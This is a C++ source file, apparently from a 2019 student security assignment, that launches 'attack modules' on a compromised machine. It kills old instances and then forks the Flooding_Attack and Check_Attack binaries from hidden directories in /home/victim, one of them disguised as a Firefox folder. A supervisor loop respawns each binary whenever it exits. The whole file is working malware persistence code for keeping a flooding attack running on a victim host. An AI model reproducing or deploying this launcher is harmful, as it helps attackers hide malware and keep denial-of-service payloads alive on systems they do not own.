// Author       : 0516220-Nicholas_Li
// Date         : 2019.04.18
// Version      : 1.0
// Description  :
//      This file launches attack modules.
#include<unistd.h>
#include<iostream>
#include<cstdlib>
#include<string>
#include<sys/wait.h>  

using namespace std;

int main(){
    string check_attack_service = 
        "#!/bin/bash\n"\
        "pgrep Check_Attack > /dev/null 2>&1 && kill $(pgrep Check_Attack) > /dev/null 2>&1\n"\
        "pgrep Flooding_Attack > /dev/null 2>&1 && kill $(pgrep Flooding_Attack) > /dev/null 2>&1";

    system(check_attack_service.c_str());
    
    pid_t pid;
    pid = fork();
    if(pid == 0){
        int access_exist = 0;
        access_exist = access("/home/victim/.etc/.module/Flooding_Attack", F_OK);
        if (access_exist == 0){
            execlp("/home/victim/.etc/.module/Flooding_Attack", "Flooding_Attack", NULL);
        }else{
            execlp("/home/victim/.syslog/.FireFox/Flooding_Attack", "Flooding_Attack", NULL);
        }
    }else{
        pid_t pid2;
        pid2 = fork();
        if(pid2 == 0){
            int access_exist = 0;
            access_exist = access("/home/victim/.etc/.module/Check_Attack", F_OK);
            if (access_exist == 0){
                execlp("/home/victim/.etc/.module/Check_Attack", "Check_Attack", NULL);
            }else{
                execlp("/home/victim/.syslog/.FireFox/Check_Attack", "Check_Attack", NULL);
            }
        }else{
            int who_terminated;
            while(1){
                who_terminated = wait(NULL);
                if(who_terminated == pid){
                    pid = fork();
                    if(pid == 0){
                        int access_exist = 0;
                        access_exist = access("/home/victim/.etc/.module/Flooding_Attack", F_OK);
                        if (access_exist == 0){
                            execlp("/home/victim/.etc/.module/Flooding_Attack", "Flooding_Attack", NULL);
                        }else{
                            execlp("/home/victim/.syslog/.FireFox/Flooding_Attack", "Flooding_Attack", NULL);
                        }
                    }
                }else if(who_terminated == pid2){
                    pid2 = fork();
                    if(pid2 == 0){
                        int access_exist = 0;
                        access_exist = access("/home/victim/.etc/.module/Check_Attack", F_OK);
                        if (access_exist == 0){
                            execlp("/home/victim/.etc/.module/Check_Attack", "Check_Attack", NULL);
                        }else{
                            execlp("/home/victim/.syslog/.FireFox/Check_Attack", "Check_Attack", NULL);
                        }
                    }
                }else{
                    continue;
                }
            }
        }
    }

    return 0;
}